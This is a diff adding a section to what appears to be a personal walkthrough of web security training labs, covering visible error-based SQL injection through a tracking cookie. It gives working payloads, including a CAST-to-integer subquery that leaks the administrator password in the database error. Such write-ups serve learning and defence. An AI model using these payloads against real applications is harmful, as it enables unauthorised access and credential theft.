@@ -462,3 +462,75 @@ This time, I've filtered the results to requests whose responses were `500 Inter
 > `oplaoviu3v6obqe2dl4p3`
 
 And with that, I logged in and the lab was completed!
+
+---
+
+## 13. Visible error-based SQL injection
+<img src="./error-based.png" width=400>
+
+### Description
+The lab involves abusing an exposed (detailed) SQL error in the application to log in to an administrator account.
+
+This was a tricky one, despite not being as time-consuming as [11](#11-blind-sql-injection-with-conditional-responses) and [12](#12-blind-sql-injection-with-conditional-errors).
+
+The analytics cookie in this lab was `5j0Wy2ztJNLeQZe6`.
+
+### Solution
+First, I tried to fish out some information by simply putting in a direct query concatenated to the analytics cookie, similar to what I did in [12](#12-blind-sql-injection-with-conditional-errors):
+> ```sql
+> SELECT password FROM users WHERE username='administrator'
+> >>>
+> 5j0Wy2ztJNLeQZe6'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')+--+
+> ```
+
+However, the error that came out was a little unexpected:
+> ```html
+> <p class=is-warning>
+>     Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = '5j0Wy2ztJNLeQZe(SELECT password FROM  users WHERE usernam'. Expected  char
+> </p>
+> ```
+
+In the above, we can observe that the command had actually been truncated at the end (`usernam'`). This led me to believe that there was some sort of word limiter implemented in the application. Therefore, the query had to be shorter. As I was not able to exfiltrate the query results anyway, I decided to delete the cookie from the payload:
+> `'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')+--+`
+
+A different error popped up:
+> ```html
+> <p class=is-warning>
+>     ERROR: syntax error at end of input
+>     Position: 97
+> </p>
+> ```
+
+However, I think that this is related to the word limit error, and may have showed differently because it has truncated my text in the middle of `'administrator'`, which would have preserved the left-most apostrophe. So, I replaced the `WHERE` query with `LIMIT 1` (because concatenation could only work with one value returned by the subquery) to see if I could pass this as a valid query: 
+> `'||(SELECT+password+FROM+users+LIMIT+1)+--+`
+
+With the above, the server returned a `200 OK`, meaning this query is valid. Now I can be sure of two things:
+1. The `users` table exists along with the `password` column. This presumably means that `username` exists too.
+2. I have to operate under a character limit.
+
+Considering the above, a brute-force exfiltration like in [12](#12-blind-sql-injection-with-conditional-errors) was out of the question. Not only that, with the servers exposing the exact error to the front end, there was a much easier way. I could simply make the value for the admin's password appear within the error, which is possible using `CAST`:
+> ```sql
+> CAST((SELECT 'hello!!!!') AS int)
+> >>>
+> '||(CAST((SELECT+'hello!!!!')+AS+int))+--+
+> ```
+
+> ```html
+> <p class=is-warning>
+>     ERROR: invalid input syntax for type integer: "hello!!!!"
+> </p>
+> ```
+
+We can adjust the above payload to:
+> `'||CAST((SELECT+password+FROM+users+LIMIT+1)+AS+int)+--+`
+
+For which the application returns the following error:
+> ```html
+> <p class=is-warning>
+>     ERROR: invalid input syntax for type integer: "osll76crlyxsnqei1g3h"
+> </p>
+> ```
+
+We use `LIMIT 1` because the account `administrator` is likely to be at the top in the context of this lab. However, in production environments this may not work and we may need other means of exfiltrating the `administrator` account's details.
+
+With the above password, I logged into the `administrator` account and the lab was finished.
